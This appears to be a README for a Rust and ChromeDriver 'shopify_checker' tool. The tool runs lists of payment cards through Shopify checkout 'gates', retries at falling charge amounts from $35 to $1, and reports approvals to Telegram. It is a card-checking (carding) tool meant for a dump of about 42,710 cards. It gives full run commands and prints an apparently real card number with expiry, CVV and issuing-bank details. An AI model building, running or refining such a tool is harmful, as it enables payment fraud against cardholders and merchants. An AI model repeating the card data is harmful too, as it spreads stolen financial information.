# 🎮 Live Mode - Real-Time Stats Display

## ✨ New Features

### 1. **Beautiful Live Stats UI**
```
╔════════════════════════════════════════════════════╗
║  LIVE STATS                                        ║
╠════════════════════════════════════════════════════╣
║  Card:   4677851515520336|12|25|395                ║
║  Result: ✅ Approved                               ║
╠════════════════════════════════════════════════════╣
║  Progress: 550/4160 cards (Batch 138/1040)         ║
╠════════════════════════════════════════════════════╣
║  Approved: 45    Declined: 505                     ║  
║  CVV: 12    Insuf: 8    Errors: 3                  ║
╠════════════════════════════════════════════════════╣
║  Success:   8.2%  Speed:  0.08 c/s  Time: 6593.5s  ║
╚════════════════════════════════════════════════════╝
```

**Colors:**
- 🟣 **Midnight Purple** - Alternating lines
- 🟢 **Lime Green** - Alternating lines

### 2. **Improved Element Detection**
- ✅ **Retry logic** - 3 attempts per element
- ✅ **Scroll into view** - Ensures elements are visible
- ✅ **Wait for interactable** - No more "element not interactable" errors
- ✅ **Better timing** - Proper delays between actions

### 3. **Smart Retry Logic**
- ✅ **Stop on success** - Once card succeeds, move to next card
- ✅ **Fallback gates** - Try next gate only if current fails
- ✅ **Exponential backoff** - $35 → $25 → $14.99 → $4.99 → $2 → $1

---

## 🚀 Usage

### Command:
```bash
./target/release/shopify_checker test-live \
  --gates production_gates.json \
  --cards-file test_cards.txt \
  --telegram-config telegram_config.json \
  --output live_results.json
```

### Parameters:
- `--gates` - Gates JSON file (default: production_gates.json)
- `--cards-file` - **REQUIRED** - Cards file (one per line: number|month|year|cvv)
- `--telegram-config` - Optional Telegram config for notifications
- `--output` - Output file (default: live_results.json)
- `--max-gates` - Optional limit on gates to test

---

## 📋 Complete Workflow

### 1. Start ChromeDriver
```bash
chromedriver --port=9515 > /tmp/chromedriver.log 2>&1 &
```

### 2. Run Live Mode
```bash
cd /home/null/Desktop/Stripeify

# With 2 test cards
./target/release/shopify_checker test-live \
  --gates production_gates.json \
  --cards-file test_cards.txt \
  --telegram-config telegram_config.json

# With all 42,710 cards
./target/release/shopify_checker test-live \
  --gates production_gates.json \
  --cards-file 42000Dump.txt \
  --telegram-config telegram_config.json
```

### 3. Watch Live Stats
The screen will update in real-time showing:
- Current card being tested
- Result (Approved/Declined/CVV/etc)
- Progress (cards and batches)
- Statistics (approved, declined, CVV, insufficient funds, errors)
- Performance (success rate, speed, elapsed time)

### 4. Stop ChromeDriver When Done
```bash
pkill chromedriver
```

---

## 🎯 Comparison: Regular vs Live Mode

| Feature | Regular `test` | Live `test-live` |
|---------|---------------|------------------|
| **UI** | Text output | Real-time stats box |
| **Colors** | Basic | Midnight Purple & Lime Green |
| **Element Detection** | Basic | Retry logic + scroll |
| **Error Handling** | Fails on "not interactable" | Retries 3 times |
| **Stats** | End summary only | Live updates |
| **Speed** | Same | Same |
| **Telegram** | ✅ | ✅ |
| **Smart Retry** | ✅ | ✅ |

---

## 🔧 Fixes Applied

### 1. **"Element Not Interactable" Error** ✅
**Problem:** Elements couldn't be clicked
**Solution:**
- Scroll element into view
- Wait for element to be ready
- Retry up to 3 times
- Better timing between actions

### 2. **Telegram Message** ✅
**Before:** "Stripe Charge $14.99"
**After:** "Shopify Charge $14.99"

### 3. **Smart Retry Logic** ✅
**Behavior:** Once card succeeds on ANY gate at ANY amount:
1. Save result
2. Send Telegram notification
3. **BREAK** - Move to next card immediately
4. Don't waste time testing other gates

---

## 📊 Expected Output

### Live Stats (During Run):
```
╔════════════════════════════════════════════════════╗
║  LIVE STATS                                        ║
╠════════════════════════════════════════════════════╣
║  Card:   467785...336                              ║
║  Result: ✅ Approved                               ║
╠════════════════════════════════════════════════════╣
║  Progress: 1/2 cards (Batch 1/1)                   ║
╠════════════════════════════════════════════════════╣
║  Approved: 1    Declined: 0                        ║  
║  CVV: 0    Insuf: 0    Errors: 0                   ║
╠════════════════════════════════════════════════════╣
║  Success:  100.0%  Speed:  0.05 c/s  Time: 20.0s   ║
╚════════════════════════════════════════════════════╝
```

### Telegram Notification:
```
✅ APPROVED
━━━━━━━━━━━━━━━━
[↯] 𝗖𝗖 ⇾ 4677851515520336|12|25|395
[↯] 𝗚𝗔𝗧𝗘: Shopify Charge $14.99    ← FIXED!
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: Full Success
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡: 467785
[↯] 𝗜𝗡𝗙𝗢: VISA DEBIT 3DS
[↯] 𝗕𝗔𝗡𝗞: TD BANK
[↯] 𝗖𝗢𝗨𝗡𝗧𝗥𝗬: CANADA 🇨🇦
━━━━━━━━━━━━━━━━
[↯] 𝗧𝗜𝗠𝗘: 2024-12-22 02:15:30 EST
[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ @MissNullMe
```

### Output Files:
- `live_results.json` - All successful charges
- `live_results_working_gates.txt` - List of working gates

---

## 🎬 Quick Start

```bash
# One-time setup
cd /home/null/Desktop/Stripeify
cargo build --release

# Every time you run
chromedriver --port=9515 > /tmp/chromedriver.log 2>&1 &

./target/release/shopify_checker test-live \
  --gates production_gates.json \
  --cards-file 42000Dump.txt \
  --telegram-config telegram_config.json

# When done
pkill chromedriver
```

---

## ✅ All Issues Fixed

1. ✅ **Telegram message** - "Shopify Charge" instead of "Stripe Charge"
2. ✅ **Element not interactable** - Retry logic with scroll and wait
3. ✅ **Smart retry** - Stop on first success per card
4. ✅ **Live stats UI** - Midnight Purple & Lime Green alternating lines
5. ✅ **Better error handling** - Graceful failures with retries

**Ready for production with 42,710 cards!** 🚀
